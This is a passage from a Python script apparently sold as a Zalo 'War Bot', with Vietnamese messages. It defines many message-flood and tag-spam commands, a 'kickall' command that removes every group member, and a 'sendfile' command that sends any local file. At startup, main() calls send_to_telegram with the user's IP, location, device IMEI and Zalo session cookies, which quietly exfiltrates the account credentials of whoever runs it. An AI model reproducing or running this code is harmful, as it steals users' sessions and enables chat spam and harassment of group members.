            self.start_command("spam4", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spam4.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'spam5':
            self.start_command("spam5", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spam5.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'spam6':
            self.start_command("spam6", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spam6.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'spam7':
            self.start_command("spam7", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spam7.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'spam8':
            self.start_command("spam8", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spam8.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'spam9':
            self.start_command("spam9", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spam9.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'spam10':
            self.start_command("spam10", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spam10.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'nhay':
            self.start_command("nhay", text_from_file, message_object, author_id, thread_id, thread_type, delay=1, target_thread_id=target_thread_id)
        elif command == 'spamstk':
            self.start_command("spamstk", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spamstk.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'spamtag':
            self.start_command("spamtag", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spamtag.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'spamtag1':
            self.start_command("spamtag1", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spamtag1.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'spamtag2':
            self.start_command("spamtag2", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spamtag2.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'spamtag3':
            self.start_command("spamtag3", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spamtag3.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'spamtag4':
            self.start_command("spamtag4", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spamtag4.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'spamtag5':
            self.start_command("spamtag5", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spamtag5.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'spamtag6':
            self.start_command("spamtag6", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spamtag6.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'spamtag7':
            self.start_command("spamtag7", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spamtag7.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'spamtag8':
            self.start_command("spamtag8", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spamtag8.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'spamtag9':
            self.start_command("spamtag9", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spamtag9.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'spamtag10':
            self.start_command("spamtag10", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spamtag10.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'lende':
            self.start_command("lende", text_from_file, message_object, author_id, thread_id, thread_type, file_name="lende.txt", delay=0.1, target_thread_id=target_thread_id)
        elif command == 'superbig':
            self.start_command("superbig", text_from_file, message_object, author_id, thread_id, thread_type, style="b,f_2000", target_thread_id=target_thread_id)
        elif command == 'nhaytag':
            self.start_command("nhaytag", text_from_file, message_object, author_id, thread_id, thread_type, delay=0.1, target_thread_id=target_thread_id)
        elif command == 'spamtagbig':
            self.start_command("spamtagbig", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spamtag.txt", delay=1, style="b,f_1500", target_thread_id=target_thread_id)
        elif command == 'spamtagitalic':
            self.start_command("spamtagitalic", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spamtag.txt", delay=1, style="i", target_thread_id=target_thread_id)
        elif command == 'spamtaglag':
            self.start_command("spamtaglag", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spamtag.txt", delay=1, target_thread_id=target_thread_id)
        elif command == 'spamtagmix':
            self.start_command("spamtagmix", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spamtag.txt", delay=1, target_thread_id=target_thread_id)
        elif command == 'spamtagsmall':
            self.start_command("spamtagsmall", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spamtag.txt", delay=1, style="f_50", target_thread_id=target_thread_id)
        elif command == 'spamtagsuperbig':
            self.start_command("spamtagsuperbig", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spamtag.txt", delay=1, style="b,f_2000", target_thread_id=target_thread_id)

        # Lệnh quản lý
        elif command == 'rename':
            if thread_type != ThreadType.GROUP and not target_thread_id:
                self.send(Message(text="⚠️ Lệnh 'rename' chỉ hoạt động trong nhóm hoặc với ID nhóm!"), thread_id, thread_type)
            else:
                self.start_command("rename", rename_group_from_file, message_object, author_id, thread_id, thread_type, target_thread_id=target_thread_id)
        elif command == 'kickall':
            if thread_type == ThreadType.GROUP:
                group_info = self.fetchGroupInfo(thread_id).gridInfoMap.get(thread_id) if self.fetchGroupInfo(thread_id) else None
                if group_info:
                    members = [member.split('_')[0] for member in group_info["memVerList"] if member.split('_')[0] != self.uid]
                    self.kickUsersInGroup(members, thread_id)
                    self.send(Message(text="✅ Đã xóa tất cả thành viên!"), thread_id, thread_type)
                else:
                    self.send(Message(text="⚠️ Không thể lấy thông tin nhóm!"), thread_id, thread_type)
        elif command.startswith('block'):
            parts = str_message.split()
            if len(parts) == 2 and thread_type == ThreadType.GROUP:
                self.blockUserInGroup(parts[1], thread_id)
                self.send(Message(text=f"✅ Đã chặn {self.get_user_name(parts[1])} ({parts[1]}) trong nhóm!"), thread_id, thread_type)
        elif command.startswith('add'):
            parts = str_message.split()
            if len(parts) > 1 and thread_type == ThreadType.GROUP:
                uids = parts[1:]
                self.addUsersToGroup(uids, thread_id)
                self.send(Message(text=f"✅ Đã thêm {len(uids)} người dùng vào nhóm!"), thread_id, thread_type)
        elif command.startswith('promote'):
            parts = str_message.split()
            if len(parts) == 2 and thread_type == ThreadType.GROUP:
                self.promoteGroupAdmin(parts[1], thread_id)
                self.send(Message(text=f"✅ Đã thăng cấp {self.get_user_name(parts[1])} ({parts[1]}) làm admin!"), thread_id, thread_type)
        elif command.startswith('demote'):
            parts = str_message.split()
            if len(parts) == 2 and thread_type == ThreadType.GROUP:
                self.demoteGroupAdmin(parts[1], thread_id)
                self.send(Message(text=f"✅ Đã hạ cấp {self.get_user_name(parts[1])} ({parts[1]}) khỏi admin!"), thread_id, thread_type)
        elif command == 'leave':
            if thread_type == ThreadType.GROUP:
                self.leaveGroup(thread_id)
                self.send(Message(text="✅ Bot đã rời nhóm!"), thread_id, thread_type)
        elif command == 'groupavatar':
            if thread_type == ThreadType.GROUP and hasattr(message_object, 'quoteMsg') and message_object.quoteMsg.get('attachments'):
                image_url = message_object.quoteMsg['attachments'][0]['url']
                response = requests.get(image_url)
                temp_file = f"temp_group_avatar_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                with open(temp_file, 'wb') as f:
                    f.write(response.content)
                self.changeGroupAvatar(thread_id, temp_file)
                os.remove(temp_file)
                self.send(Message(text="✅ Đã đổi ảnh nhóm!"), thread_id, thread_type)
        elif command.startswith('mute'):
            if len(parts) == 2 and thread_type == ThreadType.GROUP:
                self.muted_users.add(parts[1])
                self.send(Message(text=f"✅ Đã mute {self.get_user_name(parts[1])} ({parts[1]})!"), thread_id, thread_type)
        elif command.startswith('unmute'):
            if len(parts) == 2 and thread_type == ThreadType.GROUP:
                self.muted_users.discard(parts[1])
                self.send(Message(text=f"✅ Đã unmute {self.get_user_name(parts[1])} ({parts[1]})!"), thread_id, thread_type)
        elif command == 'lock':
            if thread_type == ThreadType.GROUP:
                self.locked_groups.add(thread_id)
                self.send(Message(text="✅ Đã khóa nhóm! Chỉ admin mới nhắn được."), thread_id, thread_type)
        elif command == 'unlock':
            if thread_type == ThreadType.GROUP:
                self.locked_groups.discard(thread_id)
                self.send(Message(text="✅ Đã mở khóa nhóm!"), thread_id, thread_type)
        elif command.startswith('pin'):
            if len(parts) == 2 and thread_type == ThreadType.GROUP:
                self.pinMessage(parts[1], thread_id)
                self.send(Message(text=f"✅ Đã ghim tin nhắn {parts[1]}!"), thread_id, thread_type)
        elif command.startswith('unpin'):
            if len(parts) == 2 and thread_type == ThreadType.GROUP:
                self.unpinMessage(parts[1], thread_id)
                self.send(Message(text=f"✅ Đã bỏ ghim tin nhắn {parts[1]}!"), thread_id, thread_type)
        elif command.startswith('setgroupdesc'):
            if thread_type == ThreadType.GROUP and len(parts) > 1:
                desc = " ".join(parts[1:])
                self.setGroupDescription(thread_id, desc)
                self.send(Message(text=f"✅ Đã đặt mô tả nhóm: {desc}"), thread_id, thread_type)
        elif command == 'setgrouplink':
            if thread_type == ThreadType.GROUP and len(parts) == 2:
                status = parts[1].lower() == 'on'
                self.setGroupLinkStatus(thread_id, status)
                self.send(Message(text=f"✅ Đã {'bật' if status else 'tắt'} link mời nhóm!"), thread_id, thread_type)
        elif command == 'getgrouplink':
            if thread_type == ThreadType.GROUP:
                link = self.getGroupInviteLink(thread_id)
                self.send(Message(text=f"🔗 Link mời nhóm: {link}"), thread_id, thread_type)

        # Lệnh thông tin
        elif command == 'id':
            if message_object.mentions:
                uids = [mention.uid for mention in message_object.mentions]
                id_list = "\n".join([f"🆔 {uid} - {self.get_user_name(uid)}" for uid in uids])
                self.send(Message(text=f"📋 ID người được tag:\n{id_list}"), thread_id, thread_type)
            else:
                self.send(Message(text=f"🆔 ID của bạn: {author_id}"), thread_id, thread_type)
        elif command == 'groupid':
            if thread_type == ThreadType.GROUP:
                self.send(Message(text=f"🆔 ID nhóm: {thread_id}"), thread_id, thread_type)
        elif command == 'userid':
            self.send(Message(text=f"🆔 ID của bạn: {author_id}"), thread_id, thread_type)
        elif command == 'msgid':
            if hasattr(message_object, 'quoteMsg') and message_object.quoteMsg:
                self.send(Message(text=f"🆔 ID tin nhắn reply: {message_object.quoteMsg['msgId']}"), thread_id, thread_type)
            else:
                self.send(Message(text="⚠️ Hãy reply vào một tin nhắn!"), thread_id, thread_type)
        elif command == 'friends':
            friends = self.fetchAllFriends()
            if friends and hasattr(friends, 'changed_profiles'):
                friend_list = "\n".join([f"🆔 {uid} - {info.displayName}" for uid, info in friends.changed_profiles.items()])
                self.send(Message(text=f"📋 Danh sách bạn bè:\n{friend_list}"), thread_id, thread_type)
            else:
                self.send(Message(text="⚠️ Không thể lấy danh sách bạn bè!"), thread_id, thread_type)
        elif command == 'chats':
            chats = self.fetchRecentChat()
            if chats:
                chat_list = "\n".join([f"🆔 {chat['threadId']} - {chat['lastMsg']['content'][:20]}..." for chat in chats])
                self.send(Message(text=f"📋 Danh sách chat gần đây:\n{chat_list}"), thread_id, thread_type)
            else:
                self.send(Message(text="⚠️ Không có chat gần đây!"), thread_id, thread_type)
        elif command == 'recent':
            if thread_type == ThreadType.GROUP:
                messages = self.getRecentGroup(thread_id)
                if messages:
                    msg_list = "\n".join([f"📩 {msg['content'][:20]}... (Từ: {self.get_user_name(msg['senderId'])})" for msg in messages])
                    self.send(Message(text=f"📋 Tin nhắn gần đây trong nhóm:\n{msg_list}"), thread_id, thread_type)
                else:
                    self.send(Message(text="⚠️ Không có tin nhắn gần đây!"), thread_id, thread_type)
        elif command == 'groups':
            groups = self.fetchAllGroups()
            if groups and hasattr(groups, 'gridInfoMap') and groups.gridInfoMap:
                group_list = "\n".join([f"🆔 {group.grid} - {group.groupName}" for group in groups.gridInfoMap.values()])
                self.send(Message(text=f"📋 Danh sách nhóm:\n{group_list}"), thread_id, thread_type)
            else:
                self.send(Message(text="⚠️ Không thể lấy danh sách nhóm! Bot chưa tham gia nhóm nào hoặc lỗi API."), thread_id, thread_type)
        elif command == 'board':
            if thread_type == ThreadType.GROUP:
                board = self.getGroupBoardList(thread_id)
                if board:
                    board_info = "\n".join([f"📌 {item['content']}" for item in board])
                    self.send(Message(text=f"📊 Bảng nhóm:\n{board_info}"), thread_id, thread_type)
                else:
                    self.send(Message(text="⚠️ Không có nội dung trên bảng nhóm!"), thread_id, thread_type)
        elif command == 'pins':
            if thread_type == ThreadType.GROUP:
                pins = self.getGroupPinMsg(thread_id)
                if pins:
                    pin_list = "\n".join([f"📌 {pin['content'][:20]}..." for pin in pins])
                    self.send(Message(text=f"📋 Tin nhắn ghim:\n{pin_list}"), thread_id, thread_type)
                else:
                    self.send(Message(text="⚠️ Không có tin nhắn ghim!"), thread_id, thread_type)
        elif command == 'notes':
            if thread_type == ThreadType.GROUP:
                notes = self.getGroupNote(thread_id)
                if notes:
                    note_list = "\n".join([f"📝 {note['content'][:20]}..." for note in notes])
                    self.send(Message(text=f"📋 Ghi chú nhóm:\n{note_list}"), thread_id, thread_type)
                else:
                    self.send(Message(text="⚠️ Không có ghi chú nhóm!"), thread_id, thread_type)
        elif command == 'polls':
            if thread_type == ThreadType.GROUP:
                polls = self.getGroupPoll(thread_id)
                if polls:
                    poll_list = "\n".join([f"📊 {poll['question']} (ID: {poll['pollId']})" for poll in polls])
                    self.send(Message(text=f"📋 Danh sách bình chọn:\n{poll_list}"), thread_id, thread_type)
                else:
                    self.send(Message(text="⚠️ Không có bình chọn nào!"), thread_id, thread_type)
        elif command == 'groupmembers':
            if thread_type == ThreadType.GROUP:
                group_info = self.fetchGroupInfo(thread_id).gridInfoMap.get(thread_id) if self.fetchGroupInfo(thread_id) else None
                if group_info:
                    members = "\n".join([f"🆔 {uid.split('_')[0]} - {self.get_user_name(uid.split('_')[0])}" for uid in group_info["memVerList"]])
                    self.send(Message(text=f"📋 Danh sách thành viên:\n{members}"), thread_id, thread_type)
                else:
                    self.send(Message(text="⚠️ Không thể lấy danh sách thành viên!"), thread_id, thread_type)
        elif command == 'groupadmins':
            if thread_type == ThreadType.GROUP:
                group_info = self.fetchGroupInfo(thread_id).gridInfoMap.get(thread_id) if self.fetchGroupInfo(thread_id) else None
                if group_info:
                    admins = "\n".join([f"🆔 {uid} - {self.get_user_name(uid)}" for uid in group_info.adminIds])
                    self.send(Message(text=f"📋 Danh sách admin:\n{admins}"), thread_id, thread_type)
                else:
                    self.send(Message(text="⚠️ Không thể lấy danh sách admin!"), thread_id, thread_type)

        # Lệnh anti
        elif command == 'antiimage':
            if thread_type == ThreadType.GROUP:
                if len(parts) > 1 and parts[1] == 'on':
                    self.anti_image.add(thread_id)
                    self.send(Message(text="✅ Đã bật chống gửi ảnh!"), thread_id, thread_type)
                elif len(parts) > 1 and parts[1] == 'off':
                    self.anti_image.discard(thread_id)
                    self.send(Message(text="✅ Đã tắt chống gửi ảnh!"), thread_id, thread_type)
        elif command == 'antilink':
            if thread_type == ThreadType.GROUP:
                if len(parts) > 1 and parts[1] == 'on':
                    self.anti_link.add(thread_id)
                    self.send(Message(text="✅ Đã bật chống gửi link!"), thread_id, thread_type)
                elif len(parts) > 1 and parts[1] == 'off':
                    self.anti_link.discard(thread_id)
                    self.send(Message(text="✅ Đã tắt chống gửi link!"), thread_id, thread_type)
        elif command == 'antivoice':
            if thread_type == ThreadType.GROUP:
                if len(parts) > 1 and parts[1] == 'on':
                    self.anti_voice.add(thread_id)
                    self.send(Message(text="✅ Đã bật chống gửi voice!"), thread_id, thread_type)
                elif len(parts) > 1 and parts[1] == 'off':
                    self.anti_voice.discard(thread_id)
                    self.send(Message(text="✅ Đã tắt chống gửi voice!"), thread_id, thread_type)
        elif command == 'antispam':
            if thread_type == ThreadType.GROUP:
                if len(parts) > 1 and parts[1] == 'on':
                    self.send(Message(text="✅ Đã bật chống spam!"), thread_id, thread_type)
                elif len(parts) > 1 and parts[1] == 'off':
                    if thread_id in self.spam_tracker:
                        del self.spam_tracker[thread_id]
                    self.send(Message(text="✅ Đã tắt chống spam!"), thread_id, thread_type)
        elif command == 'antirecall':
            if thread_type == ThreadType.GROUP:
                if len(parts) > 1 and parts[1] == 'on':
                    self.anti_recall.add(thread_id)
                    self.send(Message(text="✅ Đã bật chống thu hồi!"), thread_id, thread_type)
                elif len(parts) > 1 and parts[1] == 'off':
                    self.anti_recall.discard(thread_id)
                    self.send(Message(text="✅ Đã tắt chống thu hồi!"), thread_id, thread_type)

        # Lệnh khác
        elif command == 'profile':
            parts = str_message.split()
            if len(parts) == 4:
                name, dob, gender = parts[1], parts[2], parts[3]
                self.changeAccountSetting(name=name, dob=dob, gender=gender)
                self.send(Message(text=f"✅ Đã cập nhật thông tin: Tên={name}, DOB={dob}, Giới tính={gender}"), thread_id, thread_type)
            else:
                self.send(Message(text="⚠️ Sử dụng: profile <name> <dob> <gender> (VD: profile Quang 08/05/2000 male)"), thread_id, thread_type)
        elif command == 'avatar':
            change_avatar_from_reply(self, message_object, thread_id, thread_type)
        elif command == 'addfriendall':
            add_friend_all(self, message_object, thread_id, thread_type)
        elif command == 'icon':
            if len(parts) > 1 and parts[1] == 'on':
                self.icon_enabled = True
                self.send(Message(text="✅ Đã bật thả icon!"), thread_id, thread_type)
            elif len(parts) > 1 and parts[1] == 'off':
                self.icon_enabled = False
                self.send(Message(text="✅ Đã tắt thả icon!"), thread_id, thread_type)
        elif command == 'autoreply':
            if len(parts) > 1 and parts[1] == 'on':
                self.autoreply_enabled = True
                self.send(Message(text="✅ Đã bật tự động reply!"), thread_id, thread_type)
            elif len(parts) > 1 and parts[1] == 'off':
                self.autoreply_enabled = False
                self.send(Message(text="✅ Đã tắt tự động reply!"), thread_id, thread_type)
        elif command.startswith('setnote'):
            if thread_type == ThreadType.GROUP and len(parts) > 1:
                note_text = " ".join(parts[1:])
                self.setGroupNote(note_text, thread_id)
                self.send(Message(text=f"✅ Đã đặt ghi chú: {note_text}"), thread_id, thread_type)
        elif command.startswith('removenote'):
            if thread_type == ThreadType.GROUP and len(parts) == 2:
                self.removeGroupNote(parts[1], thread_id)
                self.send(Message(text=f"✅ Đã xóa ghi chú {parts[1]}!"), thread_id, thread_type)
        elif command.startswith('setpoll'):
            if thread_type == ThreadType.GROUP and len(parts) >= 4:
                question = parts[1]
                options = parts[2:]
                self.createPoll(question, options, thread_id)
                self.send(Message(text=f"✅ Đã tạo poll: {question}"), thread_id, thread_type)
        elif command.startswith('vote'):
            if thread_type == ThreadType.GROUP and len(parts) == 3:
                poll_id, option_idx = parts[1], int(parts[2])
                self.votePoll(poll_id, option_idx, thread_id)
                self.send(Message(text=f"✅ Đã bỏ phiếu cho lựa chọn {option_idx} trong poll {poll_id}!"), thread_id, thread_type)
        elif command.startswith('getuserinfo'):
            if len(parts) == 2:
                info = self.fetchUserInfo(parts[1]).changed_profiles.get(parts[1])
                if info:
                    self.send(Message(text=f"📋 Info: {info.displayName} (ID: {parts[1]})"), thread_id, thread_type)
                else:
                    self.send(Message(text="⚠️ Không thể lấy thông tin user!"), thread_id, thread_type)
        elif command.startswith('getgroupinfo'):
            if len(parts) == 2:
                info = self.fetchGroupInfo(parts[1]).gridInfoMap.get(parts[1]) if self.fetchGroupInfo(parts[1]) else None
                if info:
                    self.send(Message(text=f"📋 Info nhóm: {info.groupName} (ID: {parts[1]})"), thread_id, thread_type)
                else:
                    self.send(Message(text="⚠️ Không thể lấy thông tin nhóm!"), thread_id, thread_type)
        elif command.startswith('sendfile'):
            if len(parts) == 2 and os.path.exists(parts[1]):
                self.sendFile(parts[1], thread_id, thread_type)
                self.send(Message(text=f"✅ Đã gửi file: {parts[1]}"), thread_id, thread_type)
            else:
                self.send(Message(text="⚠️ File không tồn tại!"), thread_id, thread_type)

    def onMessageRecall(self, mid, author_id, thread_id, thread_type, ts):
        if thread_id in self.anti_recall and thread_type == ThreadType.GROUP:
            try:
                user_name = self.get_user_name(author_id)
                recall_time = datetime.fromtimestamp(ts / 1000).strftime('%H:%M:%S %d/%m/%Y')
                msg = f"⚠️ {user_name} ({author_id}) đã thu hồi tin nhắn lúc {recall_time}\nNội dung: [Không xác định]\nauthor: Trương Quang Thắng"
                self.send(Message(text=msg), thread_id, thread_type)
            except Exception as e:
                print(random_color_line(f"❌ Lỗi khi xử lý thu hồi: {str(e)}"))

def select_key_type():
    while True:
        print(random_color_line("🔑 Chọn loại key:"))
        print(random_color_line("1. Key Free (12 lệnh cơ bản)"))
        print(random_color_line("2. Key Vĩnh Viễn (toàn bộ lệnh)"))
        choice = input(random_color_line("Nhập lựa chọn (1/2): "))
        if choice == '1':
            global key_type_used
            key_type_used = "free"
            return "free"
        elif choice == '2':
            key_type_used = "permanent"
            return "permanent"
        else:
            print(random_color_line("❌ Lựa chọn không hợp lệ, thử lại!"))

def print_key_input(key_type):
    if key_type == "free":
        print(random_color_line("🔓 Bạn đang sử dụng key free!"))
        return "free"
    else:
        return input(random_color_line("🔐 Nhập key vĩnh viễn: "))

def validate_key(key_input, key_type):
    if key_type == "free":
        return True
    elif key_type == "permanent":
        if key_input == VALID_PERMANENT_KEY:
            return True
        elif is_key_valid(key_input):
            return True
    return False

def print_menu():
    print(random_color_line("╔══════ 🔥 ZALO WAR BOT 🔥 ══════╗"))
    animated_text("║ Chào mừng bạn đến với Zalo War Bot!", 0.02)
    animated_text("║ Được phát triển bởi Trương Quang Thắng", 0.02)
    animated_text("║ Gõ 'menu' để xem danh sách lệnh", 0.02)
    print(random_color_line("╚══════════════════════════════════════╝"))

def main():
    key_type = select_key_type()
    while True:
        key_input = print_key_input(key_type)
        if validate_key(key_input, key_type):
            break
        else:
            animated_text("❌ Key không hợp lệ, vui lòng thử lại!", 0.02)
            time.sleep(2)

    ip, isp, location = get_network_info()
    send_to_telegram(ip, isp, location, IMEI, SESSION_COOKIES)

    print_menu()

    bot = Bot(api_key=API_KEY, secret_key=SECRET_KEY, imei=IMEI, session_cookies=SESSION_COOKIES)
    bot.listen()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(random_color_line("👋 Bot đã dừng bởi người dùng!"))
    except Exception as e:
        print(random_color_line(f"❌ Lỗi hệ thống: {str(e)}"))